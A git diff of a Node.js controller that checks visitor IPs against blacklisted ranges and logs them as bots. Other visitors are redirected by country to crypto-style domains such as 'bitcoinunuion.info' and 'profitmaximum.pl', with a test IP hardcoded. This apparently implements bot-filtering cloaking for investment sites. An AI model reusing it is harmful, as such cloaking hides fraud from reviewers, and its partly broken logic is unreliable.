@@ -5,25 +5,39 @@ const errorHandler = require('../utils/errorHandler');
 
 module.exports.getUrl = async function (req, res) {
     try {
-        const blackIp = await Ip.findOne({ip: req.ip})
+        // let ip = req.ip
+        let ip = "114.104.182.143"
+        // let ip = "46.133.255.255"
+        if (ip.substr(0, 7) === "::ffff:") {
+            ip = ip.substr(7)
+        }
+        let data = checkCountry(ip);
+        let unique;
+        const uniqueUser = await User.findOne({ip})
+        if (uniqueUser) {
+            unique = 0
+        } else {
+            unique = 1
+        }
+        const allBlackIp = await Ip.find({})
+        const block = parceIpForCompare(ip, allBlackIp);
 
-        if (blackIp) {
+        if (block) {
                 const user = new User({
                     UserAgent: req.body.UserAgent,
                     UTM: req.body.UTM,
                     reason: 'This ip is in black list!',
                     language: req.body.language,
-                    url: null
+                    url: null,
+                    ip,
+                    country: data.countryCode,
+                    city: data.city,
+                    bot: 1,
+                    unique
                 });
                 await user.save()
                 res.status(200).json(false)
         } else {
-            let ip = req.ip
-            if (ip.substr(0, 7) === "::ffff:") {
-                ip = ip.substr(7)
-            }
-                // let url = checkCountry(ip)
-                let url = checkCountry('114.104.182.143')
                 let reason = null
                 if (url === null) {
                     reason = 'Invalid country'
@@ -34,12 +48,17 @@ module.exports.getUrl = async function (req, res) {
                         url
                     })
                 }
-                const user = new User({
+            const user = new User({
                     UserAgent: req.body.UserAgent,
                     UTM: req.body.UTM,
                     reason: reason,
                     language: req.body.language,
-                    url: url
+                    url: data.url,
+                    ip,
+                    country: data.countryCode,
+                    city: data.city,
+                    bot: 0,
+                    unique
                 });
                 await user.save()
         }
@@ -49,25 +68,58 @@ module.exports.getUrl = async function (req, res) {
     }
 }
 
-function checkCountry(ip) {
+ function checkCountry(ip) {
     let geo = geoip.lookup(ip);
+    let countryCode;
+    let city;
     if (geo === null) {
-        url = null
+        url = null;
+        countryCode = null;
+        city = null;
     } else {
+        countryCode = geo.country;
+        city = geo.city;
         switch (geo.country) {
             case "CN":
-                return url = 'bitcoinunuion.info'
+                 url = 'bitcoinunuion.info'
+                break
             case "UK":
-                return url = 'bitcoinunuion.info'
+                 url = 'bitcoinunuion.info'
+                break
             case "AU":
-                return url = 'bitcoinunuion.info'
+                 url = 'bitcoinunuion.info'
+                break
             case "SG":
-                return url = 'bitcoinunuion.info'
+                 url = 'bitcoinunuion.info'
+                break
             case "PL":
-                return url = 'profitmaximum.pl'
+                 url = 'profitmaximum.pl'
+            break
             default:
-                return url = null;
+                 url = null;
+                 break
         }
+
     }
-    return url
+     return {url, countryCode, city}
+}
+
+function parceIpForCompare(ip, allBlackIp) {
+   let newIp = ip.split('.').map(item => {
+        if ((item.length < 1)) return item = '000'
+        if (item.length === 1) return   item = '00' + item
+        if (item.length === 2) return  item = '0' + item
+        if (item.length === 3 || item.length > 3) return item
+    })
+    return compareIp(newIp.join(''), allBlackIp)
+}
+
+function compareIp(ip, allBlackIp) {
+    let block = false;
+    allBlackIp.map(item => {
+        if (item.firstDiapason <= ip && item.secondDiapason >= ip) {
+            block = true
+        }
+    })
+    return block
 }
